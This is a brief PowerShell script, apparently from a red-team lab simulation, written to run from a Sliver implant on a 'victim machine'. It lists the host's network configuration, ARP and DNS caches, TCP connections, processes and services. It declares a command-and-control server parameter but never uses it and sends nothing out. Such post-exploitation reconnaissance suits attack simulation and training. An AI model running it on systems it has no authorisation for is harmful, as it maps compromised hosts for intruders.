# Recon: Network Enumeration Simulation
# Run from Sliver implant on victim machine

param(
    [string]$C2Server = "192.168.56.101",
    [string]$Port = "443"
)

Write-Host "[*] Simulating network reconnaissance..." -ForegroundColor Yellow

# Enumerate network info
Write-Host "[+] Gathering network configuration..." -ForegroundColor Cyan
$netInfo = Get-NetIPAddress -AddressFamily IPv4 | Select-Object IPAddress, InterfaceAlias
$netInfo | Format-Table

# ARP table
Write-Host "[+] Enumerating ARP cache..." -ForegroundColor Cyan
$arp = Get-NetNeighbor | Select-Object IPAddress, LinkLayerAddress, State
$arp | Format-Table

# DNS cache
Write-Host "[+] Enumerating DNS cache..." -ForegroundColor Cyan
$dns = Get-DnsClientCache | Select-Object Entry, Name, Data
$dns | Format-Table

# Active connections
Write-Host "[+] Enumerating active connections..." -ForegroundColor Cyan
$connections = Get-NetTCPConnection | Select-Object LocalAddress, LocalPort, RemoteAddress, RemotePort, State
$connections | Format-Table

# Running processes
Write-Host "[+] Enumerating running processes..." -ForegroundColor Cyan
$procs = Get-Process | Select-Object Name, Id, CPU, WorkingSet
$procs | Sort-Object CPU -Descending | Select-Object -First 20 | Format-Table

# Services
Write-Host "[+] Enumerating services..." -ForegroundColor Cyan
$services = Get-Service | Where-Object { $_.Status -eq "Running" } | Select-Object Name, DisplayName
$services | Format-Table

Write-Host "[*] Recon complete. Results logged." -ForegroundColor Green
